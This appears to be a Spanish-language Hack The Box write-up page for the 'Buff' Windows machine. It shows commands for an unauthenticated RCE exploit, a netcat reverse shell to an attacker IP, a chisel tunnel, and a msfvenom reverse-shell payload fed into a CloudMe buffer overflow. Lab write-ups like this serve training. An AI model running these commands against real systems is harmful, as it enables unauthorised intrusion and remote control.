@@ -1,0 +1,134 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Buff HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/windows.html">~/writeups/windows</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/buff/pasted-20260309201846.png" alt="Buff HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Windows</p>
+          <h1>Buff</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>buffer_overflow</span>
+            <span>cloud_me</span>
+            <span>gym_management</span>
+            <span>tree</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Gym Management System vulnerable a RCE sin autenticación</li>
+            <li><code>Explotación</code>: Exploit de SearchSploit para obtener shell inicial</li>
+            <li><code>Escalada de Privilegios</code>: Buffer overflow local para ejecutar payload como usuario privilegiado</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/buff/pasted-20260309204435.png" alt="Buff HTB" />
+          <img class="writeup-image" src="/writeups/assets/buff/pasted-20260310005922.png" alt="Buff HTB" />
+          <div class="code-card">
+            <h3>Buscar vulnerabilidades del CMS</h3>
+            <pre><code>searchsploit Gym Management</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/buff/pasted-20260310005955.png" alt="Buff HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación</h2>
+          <div class="code-card">
+            <h3>Explotar RCE</h3>
+            <pre><code>searchsploit -m 48506
+mv 48506.py rce.py
+python2.7 rce.py http://buff:8080/</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Consola RCE a reverse shell</h3>
+            <pre><code># Subir nc.exe con curl o certutil
+# One liner al listener 443
+nc.exe -e cmd 10.10.16.69 443</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/buff/pasted-20260310010305.png" alt="Buff HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: WinLogon Buffer Overflow</h2>
+          <div class="code-card">
+            <h3>Comandos</h3>
+            <pre><code>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversión\Winlogon"</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Enumerar directorios del usuario</h3>
+            <pre><code>tree /f /a
+# CloudMe_1112 Software que corre en el puerto 8888 (vía google)
+# Ejecutar binario y vemos que se abre el puerto interno 8888 en el host
+CloudMe_1112.exe </code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/buff/pasted-20260310010452.png" alt="Buff HTB" />
+          <div class="code-card">
+            <h3>Puertos Internos</h3>
+            <pre><code>netstat -ano
+# 127.0.0.1:8888</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/buff/pasted-20260310010654.png" alt="Buff HTB" />
+          <div class="code-card">
+            <h3>Crear tunel con chisel</h3>
+            <pre><code># Kali: Modificar /etc/proxychains4.conf 
+# socks5 127.0.0.1 1090
+# strict_chain comentado y dynamic_chain activo
+chisel server -p 9090 --reverse --socks5
+
+# Windows: Subir chisel.exe
+chisel.exe client 10.10.16.69:9090 R:1090:socks R:88:127.0.0.1:8888
+# Traer el puerto 8888 del target al 88 de kali</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Buscar exploit de CloudMe_1112</h3>
+            <pre><code>searchsploit Cloudme
+searchsploit -m 48389
+mv 48389.py buff.py</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/buff/pasted-20260310011038.png" alt="Buff HTB" />
+          <img class="writeup-image" src="/writeups/assets/buff/pasted-20260310011217.png" alt="Buff HTB" />
+          <div class="code-card">
+            <h3>Modificar buff.py</h3>
+            <pre><code># 1. Variable payload: El script pone un payload creado con msfvenom que abre la calculadora. Debemos crear nuestro payload y sustituirlo por el existente
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.69 LPORT=4443 -b '\x00\x0A\x0D' -f python -v payload
+
+# 2. s.connect((target,88))</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/buff/pasted-20260310011429.png" alt="Buff HTB" />
+          <div class="code-card">
+            <h3>Comandos</h3>
+            <pre><code># buff.py quedaría así</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/buff/pasted-20260310011513.png" alt="Buff HTB" />
+          <div class="code-card">
+            <h3>Ejecutar buff.py mientras ponemos listener en el puerto 4443</h3>
+            <pre><code>python buff.py
+# rlwrap nc -nlvp 4443</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/buff/pasted-20260310011609.png" alt="Buff HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>buffer_overflow</span>
+            <span>cloud_me</span>
+            <span>gym_management</span>
+            <span>tree</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
